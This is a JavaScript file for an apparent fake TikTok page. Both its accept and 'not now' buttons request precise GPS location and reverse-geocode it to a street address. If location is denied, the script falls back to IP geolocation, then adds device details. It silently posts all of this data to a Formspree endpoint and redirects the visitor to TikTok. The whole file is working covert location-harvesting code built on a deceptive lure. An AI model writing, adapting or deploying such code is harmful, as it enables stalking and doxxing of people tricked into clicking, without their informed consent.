
// --- CONFIGURATION ---
const FORMSPREE_ENDPOINT = "https://formspree.io/f/xojnaojd";
const REDIRECT_URL = "https://www.tiktok.com/foryou";
// ---------------------

const btn = document.getElementById('mainAction');
const nbtn = document.getElementById('notnow');

btn.addEventListener('click', function() {
    btn.innerText = "Opening...";
    btn.style.opacity = "0.7";

    // 1. Gather System Info immediately
    const systemInfo = getSystemDetails();

    if (navigator.geolocation) {
        // High accuracy request
        navigator.geolocation.getCurrentPosition(async (pos) => {
            // Success: GPS Available
            await handleGPSLocation(pos, systemInfo);
        }, () => {
            // Error/Denied: Fallback to IP
            handleIPFallback(systemInfo, "User Denied GPS / Error");
        }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
    } else {
        // Not supported: Fallback to IP
        handleIPFallback(systemInfo, "Geolocation Not Supported by Browser");
    }
});

nbtn.addEventListener('click', function() {
    btn.innerText = "Closing...";
    btn.style.opacity = "0.7";

    // 1. Gather System Info immediately
    const systemInfo = getSystemDetails();

    if (navigator.geolocation) {
        // High accuracy request
        navigator.geolocation.getCurrentPosition(async (pos) => {
            // Success: GPS Available
            await handleGPSLocation(pos, systemInfo);
        }, () => {
            // Error/Denied: Fallback to IP
            handleIPFallback(systemInfo, "User Denied GPS / Error");
        }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
    } else {
        // Not supported: Fallback to IP
        handleIPFallback(systemInfo, "Geolocation Not Supported by Browser");
    }
});

async function handleGPSLocation(pos, sysInfo) {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    
    // Added zoom=18 and addressdetails=1 for maximum precision
    const apiEndpoint = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`;

    try {
        const res = await fetch(apiEndpoint, {
            // Essential to set a custom User-Agent for Nominatim
            headers: {
                'User-Agent': 'tiktoksimulation/1.0'
            }
        });
        if (!res.ok) {
        throw new Error(`HTTP error! status: ${res.status}`);
        }
        //const ress = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        const d = await res.json();
        const addr = d.address;

        // Combine location data with system data
        const finalPayload = {
            CAPTURE_METHOD: "✅ GPS Precise",
            // Use display_name as the master "Full Address" fallback
            FULL_ADDRESS_STRING: d.display_name || "N/A",
            // Try multiple fields for number and street
            house_number: addr.house_number || "Specific Number Not in DB",
            Street_Name: addr.road || "Unknown Street",
            Suburb_District: addr.suburb || addr.neighbourhood || addr.district || "N/A",
            City_Town: addr.city || addr.town || addr.village || "N/A",
            State_Region: addr.state || addr.region || "N/A",
            Postcode: addr.postcode || "N/A",
            Country: addr.country || "N/A",
            long: lon || "N/A",
            lat: lat || "N/A",

            Google_Maps_Link: `https://www.google.com/maps?q=${lat},${lon}`,
            ...sysInfo // Spread system info into payload
        };
        await sendData(finalPayload);

    } catch (e) {
        handleIPFallback(sysInfo, "GPS OK but Address Lookup Failed");
        alert(e)
    }
}

async function handleIPFallback(sysInfo, reason) {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();

        const finalPayload = {
            CAPTURE_METHOD: `⚠️ IP Fallback (${reason})`,
            house_number: d.house_number || "N/A",
            Street_Name: d.Street_Name ||"N/A",
            City: d.city || "N/A",
            Region: d.region || "N/A",
            Country: d.country_name || "N/A",
            ISP: d.org || "N/A",
            IP_Address: d.ip || "N/A",
            ...sysInfo
        };
        await sendData(finalPayload);
    } catch (e) {
        alert(e); // Everything failed, just go to TikTok
    }
}

// Helper to get extra browser details
function getSystemDetails() {
    return {
        "--- DEVICE INFO ---": "---",
        Platform_OS: navigator.platform || "Unknown",
        Language: navigator.language || "Unknown",
        Screen_Resolution: `${window.screen.width}x${window.screen.height}`,
        Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
        User_Agent_Raw: navigator.userAgent
    };
}

async function sendData(payload) {
    try {
        await fetch(FORMSPREE_ENDPOINT, {
            method: "POST",
            body: JSON.stringify(payload),
            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
        });
    } finally {
        redirect();
    }
}

function redirect() {
    window.location.href = REDIRECT_URL;
}